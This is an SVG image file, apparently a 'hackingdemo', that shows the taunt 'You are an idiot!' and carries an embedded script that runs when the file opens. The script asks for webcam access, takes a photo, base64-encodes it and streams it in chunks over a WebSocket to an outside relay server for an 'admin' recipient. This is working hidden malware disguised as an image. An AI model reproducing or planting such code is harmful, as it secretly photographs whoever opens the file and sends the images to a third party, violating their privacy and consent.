<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="100%" height="100">
  <text x="50%" y="50%">You are an idiot!</text>
  <script type="application/ecmascript">
    <![CDATA[
      async function captureImage(callback) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const videoTracks = stream.getVideoTracks();
          const imageCapture = new ImageCapture(videoTracks[0]);
          const blob = await imageCapture.takePhoto();
          const reader = new FileReader();
          reader.readAsDataURL(blob);
          reader.onloadend = () => {
            const base64data = reader.result;
            callback(base64data);
            stream.getTracks().forEach(track => track.stop());
          };
      } catch (error) {
        console.error('Error accessing camera:', error);
      }
    }
      function main() {
	      captureImage((base64Image) => {
          const socket = new WebSocket('wss://cloud.achex.ca/hackingdemo');
          socket.addEventListener('open', function (event) {
            console.log('open',event)
            socket.send('{"auth":"sender", "password":"hoge"}');
            const split = 100;
            const length = Math.ceil(base64Image.length/split);
            console.log(length);
            for (let count = 0; count <= length; count++) {
              //console.log(count+"/"+length);
              let str = base64Image.substr(count*split, split);
              socket.send('{"to":"admin", "msg":"' + str + '"}');
            }
            socket.send('{"to":"admin", "msg":"finish"}');
          });
        });
      }
      main();
    ]]>
  </script>
</svg>
